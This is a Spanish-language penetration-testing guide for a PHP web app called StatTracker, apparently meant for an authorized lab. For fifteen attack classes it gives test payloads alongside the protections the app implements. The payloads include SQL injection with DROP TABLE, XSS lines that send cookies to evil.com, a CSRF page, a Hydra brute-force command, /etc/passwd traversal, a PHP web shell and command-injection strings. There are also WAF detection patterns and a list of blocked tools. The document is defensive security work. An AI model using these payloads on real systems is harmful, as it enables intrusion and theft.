# 🎯 Guía de Vectores de Ataque - StatTracker

**Documento para Laboratorio de Seguridad / Pruebas de Penetración**  
**Fecha**: Agosto 2025

---

## ⚠️ AVISO IMPORTANTE

Este documento es **EDUCATIVO** y está destinado a:
- Pruebas de penetración autorizadas
- Aprendizaje de seguridad
- Validación de protecciones

**NO use esta información para atacar sistemas sin autorización.**

---

## 📋 Índice de Vectores de Ataque

1. [Inyección SQL](#1-inyección-sql)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Cross-Site Request Forgery (CSRF)](#3-cross-site-request-forgery-csrf)
4. [Fuerza Bruta en Login](#4-fuerza-bruta-en-login)
5. [Enumeración de Usuarios](#5-enumeración-de-usuarios)
6. [Session Hijacking](#6-session-hijacking)
7. [Path Traversal / LFI](#7-path-traversal--lfi)
8. [File Upload Malicioso](#8-file-upload-malicioso)
9. [Inyección de Comandos OS](#9-inyección-de-comandos-os)
10. [HTTP Parameter Pollution](#10-http-parameter-pollution)
11. [Host Header Injection](#11-host-header-injection)
12. [Timing Attacks](#12-timing-attacks)
13. [Ataques con Bots/Scrapers](#13-ataques-con-botsscrapers)
14. [Ataques DDoS](#14-ataques-ddos)
15. [IDOR (Insecure Direct Object Reference)](#15-idor-insecure-direct-object-reference)

---

## 1. Inyección SQL

### Puntos de Entrada Potenciales

| Endpoint | Parámetro | Método |
|----------|-----------|--------|
| `login.php` | `email`, `password` | POST |
| `register.php` | `email`, `nombre`, `apellidos` | POST |
| `add_data.php` | `altura`, `peso`, `fecha_registro` | POST |
| `delete_data.php` | `id` | POST (JSON) |
| `get_data.php` | `token` | GET |
| `update_profile.php` | Todos los campos | POST |

### Payloads de Prueba

```sql
-- Básicos
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
admin'--

-- Union-based
' UNION SELECT 1,2,3,4,5--
' UNION SELECT null,username,password FROM usuarios--
' UNION SELECT table_name,null FROM information_schema.tables--

-- Time-based blind
' AND SLEEP(5)--
' AND BENCHMARK(10000000,SHA1('test'))--
'; WAITFOR DELAY '0:0:5'--

-- Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Stacked queries
'; DROP TABLE usuarios;--
'; INSERT INTO usuarios VALUES(999,'admin','hacked@test.com','password');--
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Prepared Statements al 100%
```

**Código de ejemplo** (`Auth.php`):
```php
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE email = :email");
$stmt->execute(['email' => $email]);
```

**Detección WAF** (`SecurityFirewall.php`):
- 42+ patrones de SQL Injection
- Decodificación multinivel (URL, HTML entities, hex)
- Bloqueo automático de IP

---

## 2. Cross-Site Scripting (XSS)

### Tipos de XSS a Probar

#### Reflected XSS
```html
<!-- En parámetros GET -->
index.php?success=<script>alert('XSS')</script>
dashboard.php?error=<img src=x onerror=alert('XSS')>

<!-- En formularios -->
<input name="email" value="<script>alert(1)</script>">
```

#### Stored XSS
```html
<!-- En campos de registro -->
Nombre: <script>document.location='http://evil.com/?c='+document.cookie</script>
Email: test@<script>alert(1)</script>.com

<!-- En datos de métricas (menos probable pero probar) -->
```

#### DOM-based XSS
```javascript
// Manipular URL fragments
dashboard.php#<script>alert(1)</script>
```

### Payloads de Prueba

```html
<!-- Básicos -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

<!-- Evasión de filtros -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;('XSS')">
<svg/onload=alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">

<!-- Event handlers -->
<div onmouseover="alert('XSS')">hover me</div>
<input onfocus="alert('XSS')" autofocus>
<marquee onstart=alert('XSS')>

<!-- Con codificación -->
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
\u003cscript\u003ealert('XSS')\u003c/script\u003e

<!-- JavaScript URIs -->
<a href="javascript:alert('XSS')">click me</a>
<iframe src="javascript:alert('XSS')">
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Escape de salida + WAF + CSP
```

**Código de ejemplo**:
```php
echo Security::escapeHtml($userInput);
// Usa htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8')
```

**Headers CSP** (`SecurityHeaders.php`):
```
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.tailwindcss.com...
```

---

## 3. Cross-Site Request Forgery (CSRF)

### Cómo Atacar

1. **Crear página maliciosa**:
```html
<!-- csrf_attack.html -->
<html>
<body>
  <form id="csrf-form" action="http://target.com/delete_data.php" method="POST">
    <input type="hidden" name="id" value="1">
  </form>
  <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

2. **Auto-submit con imagen**:
```html
<img src="http://target.com/logout.php?token=fake" style="display:none">
```

3. **AJAX cross-origin** (bloqueado por CORS pero intentar):
```javascript
fetch('http://target.com/api/delete', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({id: 1})
});
```

### Endpoints Vulnerables Potenciales

| Endpoint | Acción Crítica |
|----------|---------------|
| `delete_data.php` | Eliminar métricas |
| `update_profile.php` | Cambiar datos de perfil |
| `update_password.php` | Cambiar contraseña |
| `logout.php` | Cerrar sesión |

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Tokens CSRF + SameSite cookies
```

**Implementación**:
```php
// Generación
$csrf_token = Security::generateCsrfToken();

// Validación
if (!Security::validateCsrfToken($_POST['csrf_token'])) {
    die("Error de seguridad");
}
```

**Cookie configuration**:
```php
session.cookie_samesite = 'Strict'
```

---

## 4. Fuerza Bruta en Login

### Herramientas y Métodos

```bash
# Con Hydra
hydra -l admin@test.com -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login.php:email=^USER^&password=^PASS^:Error"

# Con Burp Suite Intruder
# Configurar payload positions en email y password

# Script Python simple
import requests
with open('passwords.txt') as f:
    for pwd in f:
        r = requests.post('http://target/login.php', data={
            'email': 'admin@test.com',
            'password': pwd.strip(),
            'csrf_token': get_csrf_token()
        })
        if 'dashboard' in r.url:
            print(f"Found: {pwd}")
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Rate Limiting multinivel
```

**Límites configurados**:
```php
// Por IP + Email combinados
MAX_LOGIN_ATTEMPTS = 5     // Intentos máximos
LOCKOUT_TIME = 900         // 15 minutos de bloqueo
EXTENDED_LOCKOUT = 1800    // 30 minutos si persiste

// Por cuenta (independiente de IP)
ACCOUNT_LOCKOUT_ATTEMPTS = 10
ACCOUNT_LOCKOUT_TIME = 3600  // 1 hora
```

**Bloqueo de herramientas automáticas** (`UltimateShield.php`):
- Detección de User-Agent: sqlmap, hydra, burp, nikto, etc.
- Bloqueo de User-Agent vacío o muy corto

---

## 5. Enumeración de Usuarios

### Métodos de Enumeración

1. **Diferencias en mensajes de error**:
```
Email existente: "Contraseña incorrecta"
Email no existe: "Usuario no encontrado"
```

2. **Timing diferencias**:
```
Email existente → hash verification (lento)
Email no existe → respuesta inmediata (rápido)
```

3. **Registro con email existente**:
```
"Este email ya está registrado"
```

4. **Olvidé contraseña** (si existe):
```
"Se ha enviado un email" vs "Email no encontrado"
```

### 🛡️ Protección Implementada

```
✅ PARCIALMENTE PROTEGIDO
```

**Mensajes genéricos**:
```php
return "Credenciales incorrectas"; // No revela si es email o password
```

**Timing constante** (`CryptoFortress.php`):
```php
// Siempre espera mínimo 250ms
$elapsed = (hrtime(true) - $startTime) / 1e6;
if ($elapsed < 250) {
    usleep((int)((250 - $elapsed) * 1000));
}
```

⚠️ **Nota**: El registro SÍ indica si el email ya existe (necesario para UX).

---

## 6. Session Hijacking

### Vectores de Ataque

1. **Robo de cookie por XSS**:
```javascript
// Si XSS fuera posible
new Image().src = 'http://evil.com/steal?c=' + document.cookie;
```

2. **Session fixation**:
```
http://target.com/index.php?PHPSESSID=attacker_controlled_id
```

3. **MITM en HTTP**:
```
Interceptar cookie de sesión en tráfico no cifrado
```

4. **Predicción de ID de sesión**:
```
Analizar patrones en session IDs
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Múltiples capas
```

**Configuración de cookies**:
```php
HttpOnly = true      // No accesible por JavaScript
Secure = true        // Solo HTTPS
SameSite = Strict    // No cross-site
```

**Session fingerprinting** (`SessionManager.php`):
```php
// Huella basada en User-Agent + Accept-Language + Accept-Encoding
if (!hash_equals($stored_fingerprint, $current_fingerprint)) {
    // Posible hijacking - invalidar sesión
}
```

**Regeneración automática**:
```php
SESSION_REGENERATE_TIME = 300  // Cada 5 minutos
```

---

## 7. Path Traversal / LFI

### Payloads de Prueba

```
# Básicos
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd

# Con codificación
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00.jpg
../../../etc/passwd\0.jpg

# PHP wrappers
php://filter/convert.base64-encode/resource=../config.php
php://input
expect://id
phar://malicious.phar
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

### Puntos de Entrada

| Endpoint | Parámetro | Uso |
|----------|-----------|-----|
| `profile.php` | Foto de perfil | Visualización |
| N/A | Includes dinámicos | Si existieran |

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - WAF + Validación de archivos
```

**Patrones detectados** (`SecurityFirewall.php`):
```php
'/\.\.[\\\/]/',      // ../
'/%2e%2e[\\\/]/i',   // URL encoded
'/etc\/passwd/i',    // Archivos sensibles
'/proc\/self/i',     // Información del proceso
```

**PHP wrappers bloqueados**:
```php
'php://filter', 'php://input', 'expect://', 'phar://', etc.
```

---

## 8. File Upload Malicioso

### Ataques a Probar

1. **Web shell PHP**:
```php
<?php system($_GET['cmd']); ?>
```
Guardado como: `shell.php`, `shell.php.jpg`, `shell.phtml`

2. **Polyglot (imagen + PHP)**:
```
Archivo JPG válido + código PHP al final
```

3. **Doble extensión**:
```
malware.php.jpg
malware.jpg.php
```

4. **Content-Type spoofing**:
```
Enviar PHP con Content-Type: image/jpeg
```

5. **SVG con JavaScript**:
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Validación multinivel
```

**Validaciones** (`UltimateShield::isUploadSafe()`):
```php
1. Verificar que es archivo subido real (is_uploaded_file)
2. Lista negra de extensiones (60+ extensiones peligrosas)
3. MIME type real con finfo (no confiar en Content-Type)
4. Magic bytes (firma del archivo)
5. Tamaño máximo (2MB)
6. Búsqueda de código PHP en contenido
7. SVG NO permitido
```

**Tipos permitidos**:
```php
['image/jpeg', 'image/png', 'image/gif', 'image/webp']
```

---

## 9. Inyección de Comandos OS

### Payloads de Prueba

```bash
# Concatenación
; ls -la
| cat /etc/passwd
&& whoami
|| id

# Sustitución de comandos
$(whoami)
`id`

# Backticks
`cat /etc/passwd`

# Newlines
%0aid
%0A%0Dcat%20/etc/passwd

# Con codificación
;+cat+/etc/passwd
%3B%20ls%20-la
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - No hay ejecución de comandos + WAF
```

**La aplicación NO usa**:
- `exec()`
- `system()`
- `passthru()`
- `shell_exec()`
- `proc_open()`
- `popen()`

**Detección WAF**:
```php
'/[;&|`$]/',   // Operadores de shell
'/\|\|/',      // OR
'/&&/',        // AND
'/\$\(/',      // Command substitution
'/`[^`]+`/',   // Backticks
```

---

## 10. HTTP Parameter Pollution

### Ataques a Probar

```
# Duplicar parámetros
login.php?email=admin@test.com&email=attacker@test.com
login.php?id=1&id=2&id=3

# En arrays
login.php?email[]=admin&email[]=attacker

# Mixed GET/POST
GET: ?id=1
POST: id=999
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Validación pre-WAF
```

**Código** (`AdvancedProtection.php`):
```php
public static function checkParameterPollution(): bool
{
    $queryParams = [];
    parse_str($_SERVER['QUERY_STRING'] ?? '', $queryParams);
    
    foreach ($queryParams as $key => $value) {
        if (is_array($value)) {
            return false;  // Parámetro duplicado
        }
    }
    return true;
}
```

---

## 11. Host Header Injection

### Ataques a Probar

```http
# Modificar Host header
GET /reset-password HTTP/1.1
Host: evil.com

# Añadir X-Forwarded-Host
GET / HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: evil.com

# Cache poisoning
GET / HTTP/1.1
Host: legitimate.com
X-Host: evil.com
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Validación de Host Header
```

**Código** (`AdvancedProtection.php`):
```php
public static function validateHostHeader(): bool
{
    $host = $_SERVER['HTTP_HOST'] ?? '';
    
    // Verificar caracteres inválidos
    if (preg_match('/[<>"\'\\\\]/', $host)) {
        return false;
    }
    
    // Lista blanca de hosts permitidos
    $allowedHosts = ['localhost', '127.0.0.1', /* producción */];
    // ...
}
```

**Headers sospechosos bloqueados** (`UltimateShield.php`):
```php
'HTTP_X_FORWARDED_HOST',
'HTTP_X_ORIGINAL_URL',
'HTTP_X_REWRITE_URL',
'HTTP_PROXY'
```

---

## 12. Timing Attacks

### Ataques a Probar

1. **Comparación de strings**:
```python
# Medir tiempo de respuesta para diferentes longitudes de contraseña
import time, requests

for i in range(1, 20):
    pwd = 'a' * i
    start = time.time()
    requests.post('/login.php', data={'email': 'admin@test.com', 'password': pwd})
    print(f"{i} chars: {time.time() - start:.4f}s")
```

2. **Enumeración de usuarios por timing**:
```python
# Usuario existente vs no existente
start = time.time()
requests.post('/login.php', data={'email': 'exists@test.com', 'password': 'wrong'})
existing_time = time.time() - start

start = time.time()
requests.post('/login.php', data={'email': 'nonexistent@test.com', 'password': 'wrong'})
nonexistent_time = time.time() - start

# Si hay diferencia significativa → enumeración posible
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Tiempo constante
```

**Código** (`CryptoFortress.php`):
```php
public static function verifyPassword(string $password, string $hash): bool
{
    $startTime = hrtime(true);
    
    $result = password_verify($pepperedPassword, $hash);
    
    // GARANTIZAR mínimo 250ms de respuesta
    $elapsed = (hrtime(true) - $startTime) / 1e6;
    if ($elapsed < 250) {
        usleep((int)((250 - $elapsed) * 1000));
    }
    
    return $result;
}
```

**Comparación timing-safe**:
```php
hash_equals($expected, $actual)  // En lugar de === o strcmp
```

---

## 13. Ataques con Bots/Scrapers

### Herramientas Comunes

```bash
# Escaneo de vulnerabilidades
nikto -h http://target.com
sqlmap -u "http://target.com/page.php?id=1"
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ

# Automatización
curl, wget, python-requests
Selenium, Puppeteer (headless browsers)
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Detección multinivel
```

**User-Agents bloqueados** (`UltimateShield.php`):
```php
'sqlmap', 'nikto', 'nmap', 'masscan', 'nessus', 'openvas',
'acunetix', 'havij', 'pangolin', 'w3af', 'burp', 'owasp',
'dirbuster', 'gobuster', 'wfuzz', 'hydra', 'medusa', 'john',
'metasploit', 'curl/', 'wget/', 'python-requests', 'scrapy'
```

**Honeypot** (`Honeypot.php`):
```php
// Campo oculto que solo bots rellenan
<input type="text" name="website" style="display:none">

// Tiempo mínimo de envío (bots son instantáneos)
if (time() - $formLoadTime < 2) {
    // Probablemente un bot
}
```

---

## 14. Ataques DDoS

### Tipos de DDoS

1. **HTTP Flood**: Muchas requests simultáneas
2. **Slowloris**: Conexiones lentas que saturan
3. **Hash collision DoS**: Payloads que causan colisiones

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Rate limiting + Límites de tamaño
```

**Rate limiting global** (`ImpenetrableDefense.php`):
```php
// 30 requests máximo cada 10 segundos por IP
GLOBAL_RATE_LIMIT = 30
GLOBAL_RATE_WINDOW = 10
```

**Límites de tamaño** (`SecurityFirewall.php`):
```php
MAX_REQUEST_SIZE = 1048576   // 1MB máximo
MAX_INPUT_LENGTH = 10000     // Por campo
MAX_PASSWORD = 72            // Evita hash DoS
```

**Slowloris** (`AdvancedProtection.php`):
```php
// Verificar que el request no tarde más de 30 segundos
REQUEST_TIMEOUT = 30
```

---

## 15. IDOR (Insecure Direct Object Reference)

### Ataques a Probar

```
# Acceder a datos de otro usuario
GET /get_data.php?user_id=999
POST /delete_data.php {"id": 999}  # ID de otro usuario

# Modificar perfil de otro
POST /update_profile.php {"user_id": 1, "nombre": "Hacked"}

# Ver foto de otro usuario
GET /uploads/profile_999.jpg
```

### 🛡️ Protección Implementada

```
✅ PROTEGIDO - Verificación de propiedad
```

**Código** (`Metrics.php`):
```php
public function delete(int $metricId, int $userId): bool
{
    // SIEMPRE verificar que el recurso pertenece al usuario
    $stmt = $this->pdo->prepare("
        DELETE FROM estadisticas 
        WHERE id = :id AND usuario_id = :user_id
    ");
    $stmt->execute(['id' => $metricId, 'user_id' => $userId]);
    
    return $stmt->rowCount() > 0;
}
```

**El `user_id` siempre viene de la sesión**:
```php
$user_id = SessionManager::getUserId();  // Nunca del input del usuario
```

---

## 🔴 Posibles Debilidades (Para Investigar)

### 1. Información en Errores
```
⚠️ Verificar que los errores de PHP no se muestren en producción
```

### 2. Enumeración de Usuarios en Registro
```
⚠️ El registro indica si un email ya existe (necesario para UX pero revela información)
```

### 3. Falta de CAPTCHA
```
⚠️ No hay CAPTCHA en formularios (aunque hay honeypot y rate limiting)
```

### 4. 2FA No Obligatorio
```
⚠️ 2FA es opcional - un atacante con credenciales válidas puede entrar
```

### 5. No Hay Notificación de Login Sospechoso
```
⚠️ No se notifica al usuario si alguien intenta acceder desde ubicación inusual
```

---

## 📚 Recursos para Pruebas

### Herramientas Recomendadas
- **Burp Suite**: Proxy interceptor
- **OWASP ZAP**: Scanner de vulnerabilidades
- **sqlmap**: Automatización SQL injection
- **Nikto**: Scanner web
- **Wfuzz**: Fuzzing de parámetros

### Wordlists Útiles
- SecLists: `/usr/share/seclists/`
- rockyou.txt: Contraseñas comunes
- dirbuster: Directorios comunes

---

**Documento generado**: Agosto 2025  
**Para uso exclusivo en entorno de laboratorio autorizado**
